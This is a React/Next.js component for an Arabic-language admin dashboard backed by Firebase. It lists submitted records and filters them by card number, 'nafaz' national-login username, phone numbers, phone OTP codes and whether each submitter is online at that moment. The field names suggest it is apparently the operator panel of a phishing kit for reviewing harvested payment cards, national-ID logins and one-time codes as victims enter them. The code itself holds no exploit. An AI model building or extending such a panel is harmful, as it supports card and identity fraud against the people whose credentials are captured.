"use client"

import { useState, useMemo } from "react"
import { useRouter } from "next/navigation"
import { signOut } from "firebase/auth"
import { auth } from "@/lib/firestore"
import { useToast } from "@/hooks/use-toast"

import { DashboardHeader } from "./dashboard-header"
import { DashboardSidebar } from "./dashboard-sidebar"
import { NotificationsList } from "./notifications-list"
import { NotificationDetails } from "./notification-details"
import { StatsCards } from "./stats-cards"
import { useNotifications } from "./hooks/use-notifications"
import { useOnlineUsers } from "./hooks/use-online-users"

export function NotificationsDashboard() {
  const [selectedNotificationId, setSelectedNotificationId] = useState<string | null>(null)
  const [filterType, setFilterType] = useState<"all" | "card" | "online" | "nafaz" | "phone">("all")
  const [searchTerm, setSearchTerm] = useState("")
  const [sidebarCollapsed, setSidebarCollapsed] = useState(false)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)

  const router = useRouter()
  const { toast } = useToast()

  const { notifications, isLoading, updateNotification } = useNotifications()
  const { onlineUsersCount, onlineStatuses } = useOnlineUsers()

  const selectedNotification = useMemo(
    () => notifications.find((n) => n.id === selectedNotificationId) || null,
    [notifications, selectedNotificationId],
  )

  const filteredNotifications = useMemo(() => {
    return notifications.filter((notification) => {
      if (notification.isHidden) return false

      const matchesFilterType =
        filterType === "all" ||
        (filterType === "card" && !!notification.cardNumber) ||
        (filterType === "online" && onlineStatuses[notification.id]) ||
        (filterType === "nafaz" && !!notification.nafadUsername) ||
        (filterType === "phone" && (!!notification.phone || !!notification.phone2 || !!notification.phoneOtpCode))

      if (!matchesFilterType) return false

      if (searchTerm) {
        const term = searchTerm.toLowerCase()
        return (
          notification.documment_owner_full_name?.toLowerCase().includes(term) ||
          notification.phone?.toLowerCase().includes(term) ||
          notification.phone2?.toLowerCase().includes(term) ||
          notification.country?.toLowerCase().includes(term) ||
          notification.nafadUsername?.toLowerCase().includes(term)
        )
      }
      return true
    })
  }, [notifications, filterType, onlineStatuses, searchTerm])

  const handleLogout = async () => {
    try {
      await signOut(auth)
      router.push("/login")
    } catch (error) {
      toast({
        title: "خطأ في تسجيل الخروج",
        description: "حدث خطأ أثناء تسجيل الخروج",
        variant: "destructive",
      })
    }
  }

  return (
    <div className="min-h-screen bg-slate-50 dark:bg-slate-900" dir="rtl">
      {/* Header */}
      <DashboardHeader
        onlineUsersCount={onlineUsersCount}
        onLogout={handleLogout}
        onMenuToggle={() => setMobileMenuOpen(!mobileMenuOpen)}
      />

      <div className="flex h-[calc(100vh-4rem)]">
        {/* Sidebar */}
        <DashboardSidebar
          collapsed={sidebarCollapsed}
          onToggleCollapse={() => setSidebarCollapsed(!sidebarCollapsed)}
          mobileOpen={mobileMenuOpen}
          onMobileClose={() => setMobileMenuOpen(false)}
        />

        {/* Main Content */}
        <div className="flex-1 flex flex-col overflow-hidden">
          {/* Stats Cards */}
          <div className="p-6 border-b bg-white dark:bg-slate-800">
            <StatsCards notifications={notifications} onlineUsersCount={onlineUsersCount} />
          </div>

          {/* Content Area */}
          <div className="flex-1 flex overflow-hidden">
            {/* Notifications List */}
            <div className="w-96 border-l bg-white dark:bg-slate-800 flex flex-col">
              <NotificationsList
                notifications={filteredNotifications}
                selectedId={selectedNotificationId}
                onSelect={setSelectedNotificationId}
                filterType={filterType}
                onFilterChange={setFilterType}
                searchTerm={searchTerm}
                onSearchChange={setSearchTerm}
                isLoading={isLoading}
                onlineStatuses={onlineStatuses}
              />
            </div>

            {/* Details Panel */}
            <div className="flex-1">
              <NotificationDetails notification={selectedNotification} onUpdate={updateNotification} />
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
